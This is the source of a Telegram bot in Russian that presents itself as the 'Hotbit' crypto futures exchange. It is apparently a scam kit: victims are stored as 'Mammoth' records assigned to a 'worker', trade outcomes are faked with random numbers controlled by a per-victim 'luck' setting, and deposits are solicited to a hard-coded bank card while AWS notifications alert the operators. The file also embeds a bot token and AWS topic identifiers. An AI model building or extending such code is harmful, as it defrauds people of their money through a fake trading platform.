import asyncio
import datetime
import json
import logging
import re
import random
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
from aiogram.dispatcher.filters.state import State, StatesGroup
from db import Worker, session, Mammoth, Futures
from img import generate_profile_stats_for_worker
from  aws import sns, aws_region, aws_access_key_id, aws_secret_access_key


admin_chat_id  = '881704893'
API_TOKEN = '6697933833:AAFVFw0NlunxTO741GRBf3krcjDbIL_mXp8'
crypto_symbols = ['BTC', 'BCH', 'XRP', 'DOGE', 'ETH', 'BNB', 'LTC', 'LUNA', 'SOL', 'TRX', 'ADA', 'DOT', 'MATIC', 'XMR', 'EUR']
cryptocurrencies = ['bitcoin', 'bitcoin_cash', 'ripple', 'doge', 'ethereum', 'binance_coin', 'litecoin', 'terra', 'solana', 'tron', 'cardano', 'polkadot', 'polygon',
                    'polygon', 'monero', 'euro' ]



def generate_number_for_futures(start_price, luck):


    # Начальное значение
    start_price = float(start_price)# Здесь установлено начальное значение 26 000



    # Генерируем случайное число от -10 до 10 с шагом 0.1
    random_change = random.randrange(-100, 101, 1) / 10.0

    # Проверяем вероятность
    if random.random() * 100 <= luck:
        # Если выпадает в 70% вероятности, то число будет выше start_price
        generated_price = start_price + ((start_price * random_change)/100)
    else:
        # В противном случае, число будет ниже start_price
        generated_price = start_price - ((start_price * random_change)/100)

    return generated_price

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

def choose_duration_futures(id_field):
    duration_options = [30, 60, 120, 180]
    keyboard = InlineKeyboardMarkup()

    for duration in duration_options:
        callback_data = json.dumps({
            'id_field' : id_field,
            'duration' :duration
        })
        print(callback_data)
        button_text = f"{duration} секунд" if duration < 60 else f"{duration // 60} минут"
        keyboard.add(InlineKeyboardButton(button_text, callback_data=callback_data))

    return keyboard

class NewBid(StatesGroup):
    onBid = State()

class CryptoFutures(StatesGroup):
    first = State()

for cryptocurrency in cryptocurrencies:



    exec(f'''
def show_{cryptocurrency}_futures():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('Повышение', callback_data='{cryptocurrency}_price_increase'), InlineKeyboardButton('Понижение', callback_data='{cryptocurrency}_price_decrease'))
    return keyboard



        ''')

    exec(f'''
@dp.callback_query_handler(lambda callback_query: callback_query.data == f'show_{cryptocurrency}_currency')
async def handler_show_{cryptocurrency}_currency(query: types.CallbackQuery):
    from monobank import get_crypto_price_async, fetch_usd_to_rub_currency
    index = cryptocurrencies.index("{cryptocurrency}")
    symbol = crypto_symbols[index]
    price_in_usd = float(await get_crypto_price_async(symbol))
    price_in_rub = float(await fetch_usd_to_rub_currency()) * price_in_usd
    await query.message.answer(text = f'Цена {cryptocurrency} сейчас = ' + f'{{price_in_usd:.2f}}' + 'USD' + '(~' + f'{{price_in_rub:.2f}}' + 'RUB' + ')', 
    reply_markup=show_{cryptocurrency}_futures())
        

''')

    exec(f'''
@dp.message_handler(state = CryptoFutures.first)
async def handle_state_crypto_futures(message: types.Message, state:FSMContext):
    
    data = await state.get_data()
    cryptocurrency = data['cryptocurrency']
    if data['is_increase'] == 'decrease':
        is_increase = False
    else:
        is_increase = True     
    
    pool = float(message.text)

    from monobank import get_crypto_price_async
    price_in_usd = await get_crypto_price_async(crypto_symbols[cryptocurrencies.index(cryptocurrency)])
    balance = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id ).first().balance
    
    if 2000 <= float(pool) <= 250000:
        if (float(pool) <= balance):
            balance = balance - pool
            session.commit()
            template = f"""
    🔸 *{{cryptocurrency}}/USD*
    💸 Баланс: *{{balance}}* RUB
    
    💱 Валюта: {{crypto_symbols[cryptocurrencies.index(cryptocurrency)]}}

    💰 Сумма пула: {{pool}} RUB
    
    💸 Начальная цена: {{price_in_usd}} USD

        """
            chat_id = message.chat.id
            message_id = message.message_id
            
            new_field_in_futures = Futures(
            message_id=message_id, 
            chat_id = chat_id, 
            user_id = message.from_user.id, 
            cryptosymbol=crypto_symbols[cryptocurrencies.index(cryptocurrency)], 
            pool = pool,
            start_price = price_in_usd,
            is_increase = is_increase
            )
            session.add(new_field_in_futures)
            session.commit()
            await message.answer(template, parse_mode=ParseMode.MARKDOWN, reply_markup = choose_duration_futures(id_field =new_field_in_futures.id ))
            await state.finish()
        else:
            await message.answer('Сумма пула больше чем ваш баланс')
            await state.finish()
    else:
        await message.answer('Введите число от 2000 до 250.000!')
        await state.finish()
            
    
        await message.answer('Введите число от 2000 до 250.000!')
        
        print(ex)
    
        ''')

    exec(f'''

@dp.callback_query_handler(lambda callback_query: callback_query.data == '{cryptocurrency}_price_increase' or callback_query.data== '{cryptocurrency}_price_decrease')
async def handler_{cryptocurrency}_price_futures(query: types.CallbackQuery): 
    
    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
    data = dict()
    data['cryptocurrency'] = '{cryptocurrency}'
    data['is_increase'] = query.data.split('_')[2]
    await state.set_data(data) 
    await query.message.answer('Введите сумму пула')
    await CryptoFutures.first.set()
    
''')




def top_up_balance():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data='top_up_balance'))

def top_up_balance_by_card():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Банковская карта', callback_data='top_up_balance_by_card'))



def show_choose_currency():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(InlineKeyboardButton('Bitcoin', callback_data='show_bitcoin_currency'), InlineKeyboardButton('Bitcoin Cash', callback_data='show_bitcoin_cash_currency'))
    keyboard.add(InlineKeyboardButton('Ripple', callback_data='show_ripple_currency'), InlineKeyboardButton('Doge', callback_data='show_doge_currency'))
    keyboard.add(InlineKeyboardButton('Ethereum', callback_data='show_ethereum_currency'), InlineKeyboardButton('Binance Coin',
                                                                                                                callback_data='show_binance_coin_currency'))
    keyboard.add(InlineKeyboardButton('Litecoin', callback_data='show_litecoin_currency'), InlineKeyboardButton('Terra', callback_data='show_terra_currency'))
    keyboard.add(InlineKeyboardButton('Solana', callback_data='show_solana_currency'), InlineKeyboardButton('TRON', callback_data='show_tron_currency'))
    keyboard.add(InlineKeyboardButton('Cardano', callback_data='show_cardano_currency'), InlineKeyboardButton('Polkadot', callback_data='show_polkadot_currency'))
    keyboard.add(InlineKeyboardButton("Polygon", callback_data='show_polygon_currency'), InlineKeyboardButton('Monero', callback_data='show_monero_currency'))
    keyboard.add(InlineKeyboardButton('Euro', callback_data='show_euro_currency'))
    return  keyboard
markup = ReplyKeyboardMarkup(resize_keyboard=True)
portfolio = KeyboardButton('Портфель 📂')
open_ecn = KeyboardButton('Открыть ECN 💹')
info = KeyboardButton('Инфо ℹ')
support = KeyboardButton('Тех. Поддержка 🌐')

markup.add(portfolio)
markup.add(open_ecn)
markup.add(info,support)

class PortfolioStates(StatesGroup):
    ShowPortfolio = State()


class TopUpBalance(StatesGroup):
    WaitingForSum = State()

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):


    first_name = message['from']['first_name']
    template = f"""
*Приветствую, {first_name}*

Это телеграм бот криптоплатформы Hotbit  для торговли на фьючерсах. А также быстрый и бесплатный криптовалютный кошелек.
    
    
    
    """


    if not session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
        await message.reply(template, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
        new_mammonth = Mammoth(telegram_id = message.from_user.id, belongs_to_worker=admin_chat_id)
        session.add(new_mammonth)
        session.commit()
    else:
        await showportfolio(message)

@dp.message_handler(lambda message: message.text == 'Портфель 📂')
async def portfolio_handler(message: types.Message):
    if  session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
        await message.answer("⚡")
        await showportfolio(message)

@dp.message_handler(lambda message: message.text == 'Открыть ECN 💹')
async def open_ecn_handler(message: types.Message):
    if  session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first():
        currencies = await show_all_currencies()
        await message.answer(currencies, reply_markup=show_choose_currency())

@dp.message_handler(lambda message: message.text == 'Инфо ℹ')
async def info_handler(message: types.Message):

    await message.answer("Вы выбрали Инфо ℹ")

@dp.message_handler(lambda message: message.text == 'Тех. Поддержка 🌐')
async def support_handler(message: types.Message):
    await message.answer("Вы выбрали Тех. Поддержка 🌐")



@dp.message_handler(lambda message: not (2000 <= int(message.text) <= 250000), state=TopUpBalance.WaitingForSum )
async def waiting_for_sum_out_of_range(message: types.Message):
    """
    Обработчик для суммы, выходящей за пределы диапазона
    """
    await message.reply("Сумма должна быть от 2000 до 250000 рублей. Пожалуйста, введите корректную сумму.")


@dp.message_handler(lambda message: 2000 <= int(message.text) <= 250000, state=TopUpBalance.WaitingForSum )
async def waiting_for_sum_handler(message: types.Message, state:FSMContext):
    await  message.answer('Бот ожидает перевода  на карту `4441114419894785` в течении 15 минут', parse_mode=ParseMode.MARKDOWN)

    message_attributes = {
        'WorkerId': {
            'DataType': 'Number',
            'StringValue': f'{admin_chat_id}'
        },
        'MammonthId': {
            'DataType': 'Number',
            'StringValue': f'{message.from_user.id}'
        },
        'Sum': {
            'DataType': 'Number',
            'StringValue': f'{message.text}'
        },
        'FirstName': {
            'DataType': 'String',
            'StringValue': f'{message.from_user.first_name}'
        },
    }
    sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:NewApplications',

                Message=f'''NewApplicationToTopUp''', MessageAttributes=message_attributes

                )
    await state.finish()
    from monobank import waiting_for_mamont_async

    await waiting_for_mamont_async(datetime.datetime.now(), 0, 'u3dL8d8BJIbUvxNFME1wIOOGdb6BDWUlnX3_Zc9976dc')



async def show_all_currencies():

        output = ' '
        from monobank import fetch_usd_to_rub_currency
        usd_to_rub = await fetch_usd_to_rub_currency()
        for symbol in crypto_symbols:
            from monobank import get_crypto_price_async
            price_usd = await get_crypto_price_async(symbol)

            if  price_usd:


                price_rub = float(price_usd) * float(usd_to_rub)
                output += f"🔸 {symbol}/USD - {float(price_usd):.2f} USD (~ {float(price_rub):.2f} RUB)\n"

            else:
                output += f"🔸 {symbol}/USD - Недоступно\n"
        return output

async def showportfolio(message: types.Message):

    user = session.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()


    template =    f"""
📂 Личный кабинет

➖➖➖➖➖➖➖➖➖➖
*⚠️ Не верифицирован*
➖➖➖➖➖➖➖➖➖➖
💰 Баланс: {user.balance} RUB
📤 На выводе: {user.on_output} RUB
💼 Криптопортфель:
        *{user.cryptoportfolio['btc']} BTC
        {user.cryptoportfolio['eth']} ETH
        {user.cryptoportfolio['ltc']} LTC*
Ваш  ID - `{user.telegram_id}`
➖➖➖➖➖➖➖➖➖➖
Успешных сделок - {user.succesful_deals}
Всего сделок - {user.deals}
➖➖➖➖➖➖➖➖➖➖

Дата и время: {user.created_at.strftime("%d.%m.%Y %H:%M:%S")}  
    
    """
    with open('hotbit.jpg', 'rb') as image:
        await bot.send_photo(message.from_user.id, InputFile(image), caption=template, reply_markup=top_up_balance(), parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda callback_query: callback_query.data.startswith('{"id_field":'))
async def futures_edit_msg_handler(query: types.CallbackQuery):
    query_data = json.loads(query.data)
    id_field = query_data['id_field']
    duration = query_data['duration']
    time_func = 0
    futures_field = session.query(Futures).filter(Futures.id==id_field).first()
    from monobank import get_crypto_price_async,fetch_usd_to_rub_currency
    while True:
        if time_func >= duration:
            end_price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol ),
                                                    luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck

                                                    )
            usd_to_rub =float( await fetch_usd_to_rub_currency())
            btcs = (futures_field.pool/usd_to_rub)/futures_field.start_price
            btcs_for_decrease = (futures_field.pool/usd_to_rub)/end_price
            await bot.send_message(chat_id=futures_field.chat_id, text=f'''
                    Цена сейчас: {end_price}
                    Времени прошло {time_func}/{duration}
        
                    ''' )


            if futures_field.is_increase:
                if futures_field.start_price > end_price:

                    await bot.send_message(chat_id=futures_field.chat_id, text=f'''
                                        Вы потеряли {btcs*futures_field.start_price - btcs*end_price  } RUB

                                        ''')
                    user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                    user.balance -= btcs*futures_field.start_price - btcs*end_price
                    session.commit()
                    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                    data = dict()
                    data['MammonthTelegramId'] = futures_field.user_id
                    data['Amount'] = 0-(btcs*futures_field.start_price - btcs*end_price)
                    await state.set_data(data)
                    await NewBid.onBid.set()


                else:
                    await bot.send_message(chat_id=futures_field.chat_id, text=f'''
                                                            Вы получили {btcs * end_price - btcs *futures_field.start_price } RUB

                                                            ''')
                    user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                    user.balance += btcs * end_price - btcs *futures_field.start_price
                    session.commit()

                    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                    data = dict()
                    data['MammonthTelegramId'] = futures_field.user_id
                    data['Amount'] = btcs * end_price - btcs *futures_field.start_price
                    await state.set_data(data)
                    await NewBid.onBid.set()



            else:
                if end_price < futures_field.start_price:
                    await bot.send_message(chat_id=futures_field.chat_id, text=f'''
                                                                                Вы получили {btcs*futures_field.start_price - btcs_for_decrease * end_price  } RUB''')
                    user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()
                    user.balance += btcs*futures_field.start_price - btcs_for_decrease * end_price
                    session.commit()

                    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                    data = dict()
                    data['MammonthTelegramId'] = futures_field.user_id
                    data['Amount'] = btcs*futures_field.start_price - btcs_for_decrease * end_price
                    await state.set_data(data)
                    await NewBid.onBid.set()

                else:
                    await bot.send_message(chat_id=futures_field.chat_id, text=f'''Вы потеряли {btcs_for_decrease * end_price - btcs*futures_field.start_price } RUB''')
                    user = session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first()

                    user.balance -=btcs_for_decrease * end_price - btcs*futures_field.start_price
                    session.commit()

                    state = dp.current_state(chat=query.message.chat.id, user=query.from_user.id)
                    data = dict()
                    data['MammonthTelegramId'] = futures_field.user_id
                    data['Amount'] = 0-(btcs_for_decrease * end_price - btcs*futures_field.start_price)
                    await state.set_data(data)
                    await NewBid.onBid.set()

            break
        price = generate_number_for_futures(start_price=await get_crypto_price_async(session.query(Futures).filter(Futures.id == id_field).first().cryptosymbol ),
                                            luck=session.query(Mammoth).filter(Mammoth.telegram_id == futures_field.user_id).first().luck
                                            )
        await bot.send_message(chat_id=futures_field.chat_id, text=f'''
        Цена сейчас: {price}
        Времени прошло {time_func}/{duration}
        
        ''', )

        time_func+=3
        await asyncio.sleep(3)



@dp.message_handler(state=NewBid.onBid)
async def handle_on_bid(message: types.Message, state:FSMContext):
    data = await state.get_data()
    message_attributes = {
        'MammonthTelegramId': {
            'DataType': 'Number',
            'StringValue': f'{data["MammonthTelegramId"]}'
        },
        'Amount': {
            'DataType': 'Number',
            'StringValue': f'{data["Amount"]}'
        },

    }
    sns.publish(TopicArn='arn:aws:sns:eu-north-1:441199499768:onBidTopic',

                Message=f'''NewApplicationOnBid''', MessageAttributes=message_attributes

                )

    await state.finish()

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance')
async def handle_top_up_balance(query: types.CallbackQuery):
    await query.message.answer('Выберите удобный для вас метод пополнения.', reply_markup=top_up_balance_by_card())
    await query.message.delete()

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_balance_by_card')
async def handle_top_up_balance_by_card(query: types.CallbackQuery):
    await TopUpBalance.WaitingForSum.set()
    await query.message.answer('💰 Введите сумму пополнения от 2500 RUB до 250000 RUB')



@dp.message_handler(commands=['get_state'])
async def get_state(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    await message.answer(f"Текущее состояние пользователя: {current_state}")

if __name__ == '__main__':
    from aiogram import executor

    storage = MemoryStorage()
    # Подключаем MemoryStorage к боту
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)

